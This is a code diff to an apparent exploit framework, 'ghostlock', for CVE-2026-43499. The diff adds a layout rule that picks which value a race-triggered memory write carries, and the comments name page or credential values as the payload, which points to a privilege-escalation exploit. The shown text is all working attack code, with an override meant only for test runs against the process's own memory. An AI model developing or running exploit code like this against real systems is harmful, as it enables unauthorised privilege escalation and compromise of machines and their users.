@@ -19,6 +19,7 @@
  */
 #include <cstdint>
 
+#include "backend/cve_2026_43499/memory/write_layout.hpp"
 #include "backend/cve_2026_43499/memory/write_encoder.hpp"
 #include "backend/cve_2026_43499/memory/write_request.hpp"
 #include "backend/cve_2026_43499/race/pi_race.hpp"
@@ -119,10 +120,15 @@ namespace ghostlock::backend::cve_2026_43499::steps {
                    /* TEMPORARY: overrides the word the attempt locks, so a run can exercise the
                     *  whole chain against a word this process owns. Null keeps the request target,
                     *  which is what a real attempt aims at. */
-                   std::uint32_t *target_word_override = nullptr) noexcept
+                   std::uint32_t *target_word_override = nullptr,
+                   /* The four values the layout chooses between, from the profile. All zero
+                    *  keeps the previous behaviour, which is what the tests expect; a caller that
+                    *  supplies them gets the layout rule applied to its request. */
+                   const memory::LayoutInputs &layout_inputs = {}) noexcept
             : race_(race), window_(window), offsets_(offsets), targets_(targets), fragment_(fragment),
               fragment_size_(fragment_size), pointer_bytes_(pointer_bytes), value_(value),
-              chain_word_(chain_word), target_word_override_(target_word_override) {}
+              chain_word_(chain_word), target_word_override_(target_word_override),
+              layout_inputs_(layout_inputs) {}
 
         [[nodiscard]] Stage last_stage() const noexcept { return stage_; }
         [[nodiscard]] memory::RequestVerdict last_request() const noexcept { return request_verdict_; }
@@ -138,7 +144,13 @@ namespace ghostlock::backend::cve_2026_43499::steps {
                 return false;
             }
             stage_ = Stage::Encode;
-            const memory::WriteArm arm = memory::arm_for(request, value_, pointer_bytes_);
+            /* The value the write carries, decided by the layout rather than passed in raw:
+             *  a leaf write carries none and aims at the target, a preserving one carries the page
+             *  or credential value. With all-zero inputs the layout still answers for a leaf, so
+             *  the previous behaviour is preserved exactly. */
+            const memory::WriteLayout layout = memory::write_layout(request, layout_inputs_);
+            const std::uintptr_t carried = layout.value != 0U ? layout.value : value_;
+            const memory::WriteArm arm = memory::arm_for(request, carried, pointer_bytes_);
             encode_verdict_ = memory::encode_waiter_arm(fragment_, fragment_size_, offsets_, arm,
                                                         pointer_bytes_);
             if (encode_verdict_ != memory::EncodeVerdict::Ok) {
@@ -176,6 +188,7 @@ namespace ghostlock::backend::cve_2026_43499::steps {
         std::size_t pointer_bytes_ = 0U;
         std::uint32_t *chain_word_ = nullptr;
         std::uint32_t *target_word_override_ = nullptr;
+        memory::LayoutInputs layout_inputs_{};
         std::uint64_t value_ = 0U;
         Stage stage_ = Stage::NotRun;
         memory::RequestVerdict request_verdict_ = memory::RequestVerdict::Ok;
